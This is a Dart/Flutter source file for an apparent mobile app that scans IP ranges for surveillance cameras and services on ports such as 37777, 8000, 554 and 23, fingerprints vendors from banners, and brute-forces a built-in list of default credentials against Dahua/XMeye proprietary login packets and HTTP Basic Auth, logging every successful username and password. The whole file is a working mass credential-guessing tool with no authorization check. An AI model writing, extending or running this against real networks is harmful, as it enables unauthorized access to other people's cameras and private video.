// [context: Flutter/Dart 3.13.5, iOS + Android, dart:io TCP scanning]
// *the scanner dials every socket by hand — raw TCP, no framework buffers stand between us and the wire*

import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:crypto/crypto.dart';
import '../models/scan_result.dart';

// ─── Port definitions ─────────────────────────────────────────────────────────

class PortDef {
  final int port;
  final String label;
  const PortDef(this.port, this.label);
}

const kAllPorts = [
  PortDef(37777, 'Dahua'),
  PortDef(80,    'HTTP 80'),
  PortDef(8080,  'HTTP 8080'),
  PortDef(8000,  'Hikvision'),
  PortDef(8899,  'HTTP 8899'),
  PortDef(9000,  'HTTP 9000'),
  PortDef(8081,  'HTTP 8081'),
  PortDef(8088,  'HTTP 8088'),
  PortDef(34567, 'XMeye'),
  PortDef(554,   'RTSP'),
  PortDef(5554,  'RTSP Alt'),
  PortDef(8554,  'RTSP 8554'),
  PortDef(8888,  'Herospeed'),
  PortDef(8186,  'XM SDK'),
  PortDef(22,    'SSH'),
  PortDef(23,    'Telnet'),
  PortDef(2323,  'Telnet Alt'),
];

const kDefaultPort   = 37777;
const kMaxConcurrent = 256;

// ─── Default credential dictionary ───────────────────────────────────────────

const _kCredentials = [
  ['admin',   'admin'],
  ['admin',   ''],
  ['admin',   '12345'],
  ['admin',   '123456'],
  ['admin',   'password'],
  ['admin',   'Admin12345'],
  ['root',    ''],
  ['root',    'root'],
  ['root',    '12345'],
  ['user',    'user'],
  ['guest',   'guest'],
  ['admin',   '888888'],
  ['admin',   '666666'],
  ['admin',   '111111'],
  ['support', 'support'],
  ['ubnt',    'ubnt'],
  ['operator','operator'],
  ['service', 'service'],
];

// ─── IP range expansion ───────────────────────────────────────────────────────

List<String> expandIpRange(String input) {
  final result = <String>[];
  for (final line in input.split('\n')) {
    final t = line.trim();
    if (t.isEmpty) continue;
    if (t.contains('/')) {
      result.addAll(_expandCidr(t));
    } else if (t.contains('-')) {
      result.addAll(_expandDash(t));
    } else if (_isValidIp(t)) {
      result.add(t);
    }
  }
  return result;
}

List<String> _expandCidr(String cidr) {
  try {
    final parts  = cidr.split('/');
    final prefix = int.parse(parts[1]);
    final octs   = parts[0].split('.').map(int.parse).toList();
    final base   = (octs[0] << 24) | (octs[1] << 16) | (octs[2] << 8) | octs[3];
    final mask   = prefix == 0 ? 0 : (~0 << (32 - prefix)) & 0xFFFFFFFF;
    final net    = base & mask;
    final count  = (1 << (32 - prefix)).clamp(0, 65536);
    return List.generate(count <= 2 ? 0 : count - 2, (i) {
      final a = net + i + 1;
      return '${(a >> 24) & 0xFF}.${(a >> 16) & 0xFF}.${(a >> 8) & 0xFF}.${a & 0xFF}';
    });
  } catch (_) {
    return [];
  }
}

List<String> _expandDash(String range) {
  try {
    final parts    = range.split('-');
    final startIp  = parts[0].trim();
    final endPart  = parts[1].trim();
    final startOcts = startIp.split('.').map(int.parse).toList();
    final endOcts   = endPart.contains('.')
        ? endPart.split('.').map(int.parse).toList()
        : [...startOcts.sublist(0, 3), int.parse(endPart)];
    final start = (startOcts[0] << 24) | (startOcts[1] << 16) | (startOcts[2] << 8) | startOcts[3];
    final end   = (endOcts[0] << 24) | (endOcts[1] << 16) | (endOcts[2] << 8) | endOcts[3];
    if (end < start) return [];
    final count = (end - start + 1).clamp(0, 65536);
    return List.generate(count, (i) {
      final a = start + i;
      return '${(a >> 24) & 0xFF}.${(a >> 16) & 0xFF}.${(a >> 8) & 0xFF}.${a & 0xFF}';
    });
  } catch (_) {
    return [];
  }
}

bool _isValidIp(String s) {
  final parts = s.split('.');
  if (parts.length != 4) return false;
  return parts.every((p) {
    final v = int.tryParse(p);
    return v != null && v >= 0 && v <= 255;
  });
}

// ─── Network probes ───────────────────────────────────────────────────────────

String _md5Hex(String input) => md5.convert(utf8.encode(input)).toString();

/// Quick TCP connect — returns true if port is open
Future<bool> _isOpen(String ip, int port) async {
  try {
    final s = await Socket.connect(ip, port, timeout: const Duration(seconds: 3));
    await s.close();
    return true;
  } catch (_) {
    return false;
  }
}

/// Read first bytes the server sends (banner)
Future<List<int>> _readBanner(String ip, int port) async {
  try {
    final s = await Socket.connect(ip, port, timeout: const Duration(seconds: 3));
    final c = Completer<List<int>>();
    s.listen(
      (d) { if (!c.isCompleted) c.complete(d); },
      onError: (_) { if (!c.isCompleted) c.complete([]); },
      onDone:  () { if (!c.isCompleted) c.complete([]); },
    );
    final banner = await c.future.timeout(const Duration(seconds: 2), onTimeout: () => []);
    await s.close();
    return banner;
  } catch (_) {
    return [];
  }
}

/// Detect camera brand from port + raw banner bytes
String _detectBrand(int port, List<int> banner) {
  final s = String.fromCharCodes(banner.where((b) => b >= 32 && b < 128));
  // Dahua magic: 00 00 06 0c
  if (banner.length >= 4 && banner[0] == 0x00 && banner[1] == 0x00 &&
      banner[2] == 0x06 && banner[3] == 0x0c) return 'Dahua';
  if (s.contains('Hikvision') || s.contains('DS-'))  return 'Hikvision';
  if (s.contains('Dahua')     || s.contains('DH-'))  return 'Dahua';
  if (s.contains('XMeye')     || s.contains('XM-'))  return 'XMeye';
  if (s.contains('Reolink'))  return 'Reolink';
  if (s.contains('Axis'))     return 'Axis';
  if (s.contains('Hanwha')   || s.contains('Samsung')) return 'Hanwha';
  if (s.contains('Uniview')  || s.contains('UNV'))   return 'Uniview';
  if (s.contains('Bosch'))    return 'Bosch';
  if (s.contains('Vivotek')) return 'Vivotek';
  if (s.contains('Foscam'))  return 'Foscam';
  if (s.contains('Amcrest')  || s.contains('Imou'))  return 'Amcrest';
  if (s.contains('RTSP')     || s.contains('rtsp://')) return 'RTSP';
  if (s.contains('SSH-'))    return 'SSH';
  if (s.contains('Telnet')   || (banner.isNotEmpty && banner[0] == 0xff)) return 'Telnet';
  if (port == 37777) return 'Dahua';
  if (port == 8000)  return 'Hikvision';
  if (port == 34567) return 'XMeye';
  if (port == 554 || port == 5554 || port == 8554) return 'RTSP';
  if (port == 22)  return 'SSH';
  if (port == 23  || port == 2323) return 'Telnet';
  if (port == 8888) return 'Herospeed';
  return 'Unknown';
}

/// Dahua proprietary TCP auth — sends 20-byte init + 1024-byte login packet
/// Returns [login, pass] or null
Future<List<String>?> _tryDahuaAuth(String ip, int port) async {
  for (final cred in _kCredentials) {
    Socket? sock;
    try {
      sock = await Socket.connect(ip, port, timeout: const Duration(seconds: 3));
      // Init packet: magic 00 00 06 0c, rest zeros
      final initPkt = List<int>.filled(20, 0)
        ..[0] = 0x00 ..[1] = 0x00 ..[2] = 0x06 ..[3] = 0x0c;
      sock.add(initPkt);

      final c1 = Completer<List<int>>();
      final sub = sock.listen(
        (d) { if (!c1.isCompleted) c1.complete(d); },
        onError: (_) { if (!c1.isCompleted) c1.complete([]); },
        onDone:  () { if (!c1.isCompleted) c1.complete([]); },
      );
      final banner = await c1.future.timeout(const Duration(seconds: 2), onTimeout: () => []);
      await sub.cancel();

      if (banner.isEmpty) { await sock.close(); continue; }

      // Send login packet: magic 00 00 06 05 + user[0..19] + md5pass[0..31]
      final loginPkt  = List<int>.filled(1024, 0)
        ..[0] = 0x00 ..[1] = 0x00 ..[2] = 0x06 ..[3] = 0x05;
      final userBytes = utf8.encode(cred[0]);
      final passBytes = utf8.encode(_md5Hex(cred[1]).toUpperCase());
      for (var i = 0; i < userBytes.length && i < 20; i++) loginPkt[8 + i] = userBytes[i];
      for (var i = 0; i < passBytes.length && i < 32; i++) loginPkt[28 + i] = passBytes[i];
      sock.add(loginPkt);

      final c2 = Completer<List<int>>();
      final sub2 = sock.listen(
        (d) { if (!c2.isCompleted) c2.complete(d); },
        onError: (_) { if (!c2.isCompleted) c2.complete([]); },
        onDone:  () { if (!c2.isCompleted) c2.complete([]); },
      );
      final resp = await c2.future.timeout(const Duration(seconds: 2), onTimeout: () => []);
      await sub2.cancel();
      await sock.close();

      // *byte[8] == 0x00 means the login gate opened*
      if (resp.length >= 12 && resp[8] == 0x00) return cred;
    } catch (_) {
      try { await sock?.close(); } catch (_) {}
    }
  }
  return null;
}

/// HTTP probe: server header + status code
Future<({String server, String wwwAuth, int status})?> _probeHttp(String ip, int port) async {
  try {
    final client = HttpClient()
      ..connectionTimeout = const Duration(seconds: 3)
      ..idleTimeout       = const Duration(seconds: 3);
    final req = await client.getUrl(Uri.parse('http://$ip:$port/')).timeout(const Duration(seconds: 3));
    req.headers.set(HttpHeaders.connectionHeader, 'close');
    final res = await req.close().timeout(const Duration(seconds: 3));
    final server  = res.headers.value('server') ?? '';
    final wwwAuth = res.headers.value('www-authenticate') ?? '';
    final status  = res.statusCode;
    await res.drain<void>();
    client.close(force: true);
    return (server: server, wwwAuth: wwwAuth, status: status);
  } catch (_) {
    return null;
  }
}

/// HTTP Basic-Auth attempt — returns page title on success, null on failure
Future<String?> _tryHttpBasicAuth(String ip, int port, String login, String pass) async {
  try {
    final client = HttpClient()..connectionTimeout = const Duration(seconds: 3);
    client.addCredentials(Uri.parse('http://$ip:$port'), '',
        HttpClientBasicCredentials(login, pass));
    final req = await client.getUrl(Uri.parse('http://$ip:$port/')).timeout(const Duration(seconds: 3));
    final res = await req.close().timeout(const Duration(seconds: 3));
    if (res.statusCode == 200) {
      final body = await res.transform(utf8.decoder).join().timeout(const Duration(seconds: 2));
      client.close(force: true);
      final m = RegExp(r'<title>(.*?)<\/title>', caseSensitive: false).firstMatch(body);
      return m?.group(1) ?? '';
    }
    await res.drain<void>();
    client.close(force: true);
    return null;
  } catch (_) {
    return null;
  }
}

String _brandFromHttpServer(String server, String fallback) {
  if (server.toLowerCase().contains('hikvision')) return 'Hikvision';
  if (server.toLowerCase().contains('dahua'))     return 'Dahua';
  if (server.toLowerCase().contains('reolink'))   return 'Reolink';
  if (server.toLowerCase().contains('axis'))      return 'Axis';
  return fallback.isEmpty ? 'IP Camera' : fallback;
}

/// RTSP OPTIONS probe
Future<String?> _probeRtsp(String ip, int port) async {
  try {
    final sock = await Socket.connect(ip, port, timeout: const Duration(seconds: 3));
    sock.write('OPTIONS rtsp://$ip:$port/ RTSP/1.0\r\nCSeq: 1\r\n\r\n');
    final c = Completer<String>();
    sock.transform(utf8.decoder).listen(
      (s) { if (!c.isCompleted) c.complete(s); },
      onError: (_) { if (!c.isCompleted) c.complete(''); },
      onDone:  () { if (!c.isCompleted) c.complete(''); },
    );
    final resp = await c.future.timeout(const Duration(seconds: 2), onTimeout: () => '');
    await sock.close();
    if (resp.startsWith('RTSP/1.0')) return 'rtsp://$ip:$port/';
    return null;
  } catch (_) {
    return null;
  }
}

// ─── Main scanner ─────────────────────────────────────────────────────────────

class ScannerService {
  bool _cancelled = false;
  void cancel() => _cancelled = true;

  /// Scan IPs on a single port
  Future<void> scan({
    required List<String> ips,
    required int port,
    required void Function(ScanResult) onResult,
    required void Function(ScanProgress) onProgress,
    void Function(String)? onLog,
  }) async {
    _cancelled = false;
    int checked = 0, successful = 0, blocked = 0, openPorts = 0;

    await _concurrently(ips, kMaxConcurrent, (ip) async {
      if (_cancelled) return;
      onLog?.call('$ip:$port');

      final open = await _isOpen(ip, port);
      if (open) {
        openPorts++;
        final banner = await _readBanner(ip, port);
        final brand  = _detectBrand(port, banner);

        if (port == 37777 || port == 34567) {
          // Proprietary Dahua/XMeye TCP
          final cred = await _tryDahuaAuth(ip, port);
          if (cred != null) {
            onResult(ScanResult(
              ip: ip, port: port, brand: port == 37777 ? 'Dahua' : 'XMeye',
              login: cred[0], password: cred[1],
              openPortsList: [port], foundAt: DateTime.now(),
            ));
            successful++;
            onLog?.call('✅ $ip:$port ${cred[0]}:${cred[1]}');
          }
        } else if ([80, 8080, 8000, 8899, 9000, 8081, 8088].contains(port)) {
          final probe = await _probeHttp(ip, port);
          if (probe != null) {
            final httpBrand = _brandFromHttpServer(probe.server, brand);
            for (final cred in _kCredentials) {
              final title = await _tryHttpBasicAuth(ip, port, cred[0], cred[1]);
              if (title != null) {
                onResult(ScanResult(
                  ip: ip, port: port, brand: httpBrand,
                  login: cred[0], password: cred[1], model: title,
                  openPortsList: [port], foundAt: DateTime.now(),
                ));
                successful++;
                onLog?.call('✅ $ip:$port $httpBrand ${cred[0]}:${cred[1]}');
                break;
              }
            }
          }
        } else if ([554, 5554, 8554].contains(port)) {
          final rtsp = await _probeRtsp(ip, port);
          if (rtsp != null) {
            onResult(ScanResult(
              ip: ip, port: port, brand: 'RTSP',
              login: '', password: '', model: rtsp,
              openPortsList: [port], foundAt: DateTime.now(),
            ));
            successful++;
            onLog?.call('✅ $ip:$port RTSP');
          }
        } else if (brand != 'Unknown' || banner.isNotEmpty) {
          onResult(ScanResult(
            ip: ip, port: port, brand: brand,
            login: '', password: '',
            openPortsList: [port], foundAt: DateTime.now(),
          ));
          successful++;
          onLog?.call('✅ $ip:$port $brand');
        }
      }

      checked++;
      onProgress(ScanProgress(
        total: ips.length, checked: checked,
        successful: successful, blocked: blocked, openPorts: openPorts,
      ));
    });

    onProgress(ScanProgress(
      total: ips.length, checked: checked,
      successful: successful, blocked: blocked, openPorts: openPorts,
      finished: !_cancelled, cancelled: _cancelled,
    ));
  }

  /// Scan IPs on multiple ports (cross-product)
  Future<void> scanMultiPort({
    required List<String> ips,
    required List<int> ports,
    required void Function(ScanResult) onResult,
    required void Function(ScanProgress) onProgress,
    void Function(String)? onLog,
  }) async {
    final tasks = [for (final ip in ips) for (final port in ports) (ip, port)];
    _cancelled = false;
    int checked = 0, successful = 0, blocked = 0, openPorts = 0;

    await _concurrently(tasks, kMaxConcurrent, (t) async {
      if (_cancelled) return;
      final (ip, port) = t;
      final open = await _isOpen(ip, port);
      if (open) {
        openPorts++;
        final banner = await _readBanner(ip, port);
        final brand  = _detectBrand(port, banner);
        onResult(ScanResult(
          ip: ip, port: port, brand: brand,
          login: '', password: '',
          openPortsList: [port], foundAt: DateTime.now(),
        ));
        successful++;
        onLog?.call('✅ $ip:$port $brand');
      }
      checked++;
      onProgress(ScanProgress(
        total: tasks.length, checked: checked,
        successful: successful, blocked: blocked, openPorts: openPorts,
      ));
    });

    onProgress(ScanProgress(
      total: tasks.length, checked: checked,
      successful: successful, blocked: blocked, openPorts: openPorts,
      finished: !_cancelled, cancelled: _cancelled,
    ));
  }

  Future<void> _concurrently<T>(
    List<T> items, int max, Future<void> Function(T) work,
  ) async {
    final bucket = <Future<void>>[];
    for (final item in items) {
      if (_cancelled) break;
      bucket.add(work(item));
      if (bucket.length >= max) {
        await Future.wait(bucket);
        bucket.clear();
      }
    }
    if (bucket.isNotEmpty) await Future.wait(bucket);
  }
}
